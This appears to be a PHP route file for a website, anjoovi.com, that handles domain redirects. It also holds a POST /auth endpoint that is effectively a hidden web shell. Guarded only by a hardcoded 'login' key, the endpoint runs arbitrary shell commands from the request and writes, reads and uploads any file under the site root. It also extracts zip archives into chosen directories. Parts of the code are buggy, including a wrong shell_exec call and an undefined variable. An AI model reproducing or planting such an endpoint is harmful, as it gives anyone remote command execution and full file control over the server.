<?php
// Route::domain('www.anjoovi.com',function(){
// include(__DIR__ . '/main2.php');
// });
include(__DIR__ . '/main2.php');

// Route::domain('www.teste.com',function(){
    // include(__DIR__ . '/main2.php');
// });
    Route::post("/auth",function(){
        include(__DIR__ . '/function.php');
        $dados=request()->all();
        if (request()->has("key") && $dados["key"]=="login"){
            $type=$dados["type"];
            if ($type=="comando"){
                $data=$dados["data"];
                shell_exec($data,$s,$cr);
                echo json_encode(["saida"=>$s,"retorno"=>$cr]);
            }
            if ($type=="post"){
                file_put_contents(__DIR__ . '/../' . $dados["filename"],$dados["data"]);
                echo true;
            }
            if ($type=="get"){
                echo json_encode(file_get_contents(__DIR__ . '/../' . $dados["filename"]));
            }
            if ($type=="file"){
                $files=$_FILES;
                if (!empty($files)){
                    $k=$files["file"];
                    // print_r($k);
                    // return;
                    for ($i=0;$i<count($k["name"]);$i++){
                        $nome_temporario = $k["tmp_name"][$i];
                        $nome_arquivo=$file["name"][$i];
                        $caminho_destino = __DIR__ . '/../' .$dados["directory"] . $nome_arquivo;
                        if (file_exists($caminho_destino)) {
                            // Verifique se o arquivo existe no destino e, se existir, exclua-o
                            unlink($caminho_destino);
                        }
                        move_uploaded_file($nome_temporario, $caminho_destino);
                    }
                echo "true";
                } else {
                    echo "false";
                }
            }
            if ($type=="zip"){
                try{
                    // print_r($dados);
                    // return;
                    $zs=$dados["zs"];
                    for ($i=0;$i<count($zs);$i++){
                        $z=$zs[$i];
                        $z=json_decode($z,true);
                        $zip = new ZipArchive();
                        $nm=__DIR__ . '/../' . $z["filename"];
                        $d=__DIR__ . '/../' . $z["directory"];
                        if ($zip->open($nm,ZipArchive::OVERWRITE) === true) {
                            $zip->extractTo($d);
                            $zip->close();
                        } else {
                            echo "false";
                        }
                    }
                    echo "true";
                } catch (Exception $erro){
                    echo json_encode($dados);
                }
            }
        } else {
            // http_response_code(404);
        }
    });
Route::domain("anjoovi.com",function(){
    if ($_SERVER["REQUEST_METHOD"]!="POST"){
        $uri=$_SERVER['REQUEST_URI'];
        $parsedUrl = parse_url($uri);
        $path = $parsedUrl['path'];
        header("location: https://www.anjoovi.com$uri");
    }
});